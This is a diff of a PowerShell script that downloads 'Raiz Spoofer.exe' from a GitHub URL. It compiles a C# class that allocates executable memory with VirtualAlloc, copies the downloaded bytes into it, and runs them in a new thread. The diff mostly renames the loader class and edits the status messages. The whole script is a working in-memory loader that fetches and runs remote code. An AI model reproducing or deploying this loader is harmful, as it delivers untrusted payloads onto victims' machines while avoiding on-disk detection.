@@ -1,32 +1,34 @@
 $url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"
 
-$source = @"
+
+$NativeLoader = @"
 using System;
 using System.Runtime.InteropServices;
-public class Loader {
-    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-    public static void Run(byte[] data) {
-        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
-        Marshal.Copy(data, 0, mem, data.Length);
+public class Runner {
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint prot);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint id);
+    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr handle, uint ms);
+    public static void Start(byte[] data) {
+        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
+        Marshal.Copy(data, 0, p, data.Length);
         uint id;
-        IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out id);
+        IntPtr h = CreateThread(IntPtr.Zero, 0, p, IntPtr.Zero, 0, out id);
         WaitForSingleObject(h, 0xFFFFFFFF);
     }
 }
 "@
 
 try {
-    Write-Host "[*] Downloading C++ Binary..." -ForegroundColor Cyan
+    Write-Host "[*] Action: Downloading C++ Binary..." -ForegroundColor Cyan
     $bin = (New-Object System.Net.WebClient).DownloadData($url)
     
-    # 이 부분이 중요합니다. 기존의 [Assembly]::Load를 절대 쓰지 마세요.
-    Write-Host "[*] Injecting Native PE..." -ForegroundColor Cyan
-    Add-Type -TypeDefinition $source
-    [Loader]::Run($bin)
+    Write-Host "[*] Action: Mapping Native Memory..." -ForegroundColor Cyan
+    Add-Type -TypeDefinition $NativeLoader
     
-    Write-Host "[+] Executed!" -ForegroundColor Green
+
+    [Runner]::Start($bin)
+    
+    Write-Host "[+] Result: Executed Successfully!" -ForegroundColor Green
 } catch {
-    Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
 }
